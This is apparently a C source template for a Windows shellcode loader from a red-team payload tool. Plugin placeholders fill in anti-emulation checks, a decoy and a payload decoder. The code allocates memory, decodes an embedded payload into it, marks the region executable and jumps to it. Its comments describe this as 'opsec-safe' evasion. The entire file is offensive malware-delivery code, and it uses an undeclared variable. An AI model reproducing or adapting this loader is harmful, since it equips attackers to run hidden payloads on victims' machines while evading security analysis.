#include <Windows.h>

#include <time.h>

char *supermega_payload;

#define p_RW  0x04
#define p_RX  0x20
#define p_RWX 0x40


{{plugin_antiemulation}}

/* iat_reuse_rx

   Standard IAT reuse shellcode
   * create new memory region for the payload
   * will set it to RX (may break some shellcodes, opsec-safe)
*/

int main()
{
	// Depends on plugin_antiemulation
	antiemulation();

	// Decoy
	{{plugin_decoy}}

	// Allocate 1
    // char *dest = ...
    char *dest = VirtualAlloc(NULL, {{PAYLOAD_LEN}}, 0x3000, p_RW);

	// Wait a bit
    //Sleep(2000);

	// Copy (and decode)
	// from: supermega_payload[]
	// to:   dest[]
{{ plugin_decoder }}

	if (VirtualProtect(dest, {{PAYLOAD_LEN}}, p_RX, &result) == 0) {
		return 7;
	}

    // Execute *dest
    (*(void(*)())(dest))();

	return 0;
}

int mystrcmp(wchar_t* str1, wchar_t* str2) {
	int i = 0;
	while (str1[i] != L'\0' && str2[i] != L'\0') {
		if (str1[i] != str2[i]) {
			return 1;
		}
		i++;
	}
	return 0;
}
